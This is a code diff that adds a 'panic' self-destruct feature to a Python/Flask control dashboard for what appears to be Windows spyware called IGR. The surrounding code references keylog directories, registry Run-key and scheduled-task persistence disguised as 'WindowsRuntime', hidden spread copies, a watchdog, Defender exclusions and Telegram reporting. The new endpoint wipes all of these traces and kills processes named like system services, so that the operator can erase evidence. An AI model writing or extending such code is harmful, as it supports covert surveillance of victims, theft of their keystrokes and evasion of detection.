@@ -1519,6 +1519,11 @@ DASHBOARD_HTML = r'''
                     <div class="section-header"><div class="section-title">Current Persistence</div></div>
                     <div id="persistenceInfo" style="line-height: 1.8;">Loading...</div>
                 </div>
+                <div class="section" style="grid-column: 1 / -1; border-color: #ef4444;">
+                    <div class="section-header"><div class="section-title" style="color: #ef4444;">PANIC - Self Destruct</div></div>
+                    <p style="color: #ef4444; margin-bottom: 15px;">Removes ALL IGR traces from this machine: registry keys, startup entries, spread copies, keylogs, watchdog, then kills itself. This cannot be undone.</p>
+                    <button class="btn danger" onclick="panicConfirm()" style="width: 100%; padding: 16px; font-size: 18px; background: #ef4444; color: #000;">PANIC - DESTROY ALL TRACES</button>
+                </div>
                 </div>
             </div>
         </div>
@@ -2060,6 +2065,14 @@ DASHBOARD_HTML = r'''
         function loadPersistenceInfo() {
             const info = document.getElementById('persistenceInfo');
             info.innerHTML = `<strong>Startup Folder:</strong> WindowsRuntime.lnk<br><strong>Scheduled Task:</strong> WindowsRuntime (at boot)<br><strong>Registry Run:</strong> HKCU\\...\\Run\\WindowsRuntime<br><strong>Internal Copies:</strong> 4 hidden locations<br><strong>Watchdog:</strong> Monitors process every 30s`;
+        }
+        function panicConfirm() {
+            if (!confirm('Are you sure? This will DELETE ALL IGR traces from this machine and kill the process. You will lose access permanently.')) return;
+            if (!confirm('FINAL WARNING: This cannot be undone. Proceed?')) return;
+            fetch('/api/panic', {method:'POST'}).then(r => r.json()).then(data => {
+                alert(data.success ? 'Self-destruct initiated. Connection will be lost.' : 'Partial: ' + (data.status || 'some items failed'));
+            }).catch(() => {});
+            logActivity('PANIC - Self destruct initiated');
         }
     </script>
 </body>
@@ -3114,6 +3127,104 @@ def stealth_registry():
         return jsonify({'success': success})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/panic', methods=['POST'])
+def panic_self_destruct():
+    """Remove ALL IGR traces from this machine then kill the process."""
+    def _panic_async():
+        _NO_WINDOW = 0x08000000
+        try:
+            import winreg
+            winreg.DeleteValue(winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE),
+                "WindowsRuntime")
+        except:
+            pass
+        try:
+            subprocess.run(['schtasks', '/delete', '/tn', 'WindowsRuntime', '/f'],
+                capture_output=True, creationflags=_NO_WINDOW)
+        except:
+            pass
+        try:
+            startup_dir = os.path.join(os.environ.get('APPDATA', ''),
+                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            for f in os.listdir(startup_dir):
+                if 'WindowsRuntime' in f or 'igr' in f.lower():
+                    try:
+                        os.remove(os.path.join(startup_dir, f))
+                    except:
+                        pass
+        except:
+            pass
+        spread_dirs = [
+            os.path.join(os.environ.get('APPDATA', '.'), "Microsoft", "WindowsRuntime"),
+            os.path.join(os.environ.get('LOCALAPPDATA', '.'), "Microsoft", "SystemService"),
+            os.path.join(os.environ.get('APPDATA', '.'), "Microsoft", "Windows", "RuntimeBroker"),
+            os.path.join(os.environ.get('PROGRAMDATA', '.'), "WpnService"),
+        ]
+        for d in spread_dirs:
+            try:
+                subprocess.run(f'attrib -h -s "{d}"', shell=True, capture_output=True, creationflags=_NO_WINDOW)
+                import shutil
+                shutil.rmtree(d, ignore_errors=True)
+            except:
+                pass
+        try:
+            marker = os.path.join(os.environ.get('APPDATA', '.'), ".igr_path")
+            if os.path.exists(marker):
+                with open(marker, 'r') as f:
+                    logdir = f.read().strip()
+                if logdir and os.path.isdir(logdir):
+                    subprocess.run(f'attrib -h -s "{logdir}"', shell=True, capture_output=True, creationflags=_NO_WINDOW)
+                    import shutil
+                    shutil.rmtree(logdir, ignore_errors=True)
+                os.remove(marker)
+        except:
+            pass
+        try:
+            state_file = os.path.join(KEYLOG_DIR, ".tg_state.json")
+            if os.path.exists(state_file):
+                os.remove(state_file)
+        except:
+            pass
+        try:
+            watchdog_path = os.path.join(KEYLOG_DIR, "_watchdog.py")
+            if os.path.exists(watchdog_path):
+                os.remove(watchdog_path)
+        except:
+            pass
+        try:
+            subprocess.run(['powershell', '-Command',
+                "Remove-MpPreference -ExclusionPath '$env:APPDATA\\Microsoft\\WindowsRuntime' -ErrorAction SilentlyContinue;"
+                "Remove-MpPreference -ExclusionProcess 'winruntime.exe' -ErrorAction SilentlyContinue"],
+                capture_output=True, creationflags=_NO_WINDOW)
+        except:
+            pass
+        try:
+            _telegram_mark_offline()
+        except:
+            pass
+        try:
+            subprocess.run(['taskkill', '/f', '/im', 'winruntime.exe'],
+                capture_output=True, creationflags=_NO_WINDOW)
+            subprocess.run(['taskkill', '/f', '/im', 'WindowsRuntime.exe'],
+                capture_output=True, creationflags=_NO_WINDOW)
+            subprocess.run(['taskkill', '/f', '/im', 'SystemService.exe'],
+                capture_output=True, creationflags=_NO_WINDOW)
+            subprocess.run(['taskkill', '/f', '/im', 'RuntimeBroker.exe'],
+                capture_output=True, creationflags=_NO_WINDOW)
+            subprocess.run(['taskkill', '/f', '/im', 'WpnService.exe'],
+                capture_output=True, creationflags=_NO_WINDOW)
+        except:
+            pass
+        try:
+            os._exit(0)
+        except:
+            import signal
+            os.kill(os.getpid(), signal.SIGTERM)
+
+    threading.Thread(target=_panic_async, daemon=True).start()
+    return jsonify({'success': True, 'status': 'Self-destruct initiated'})
 
 @app.route('/api/network/lan_scan')
 def network_lan_scan():
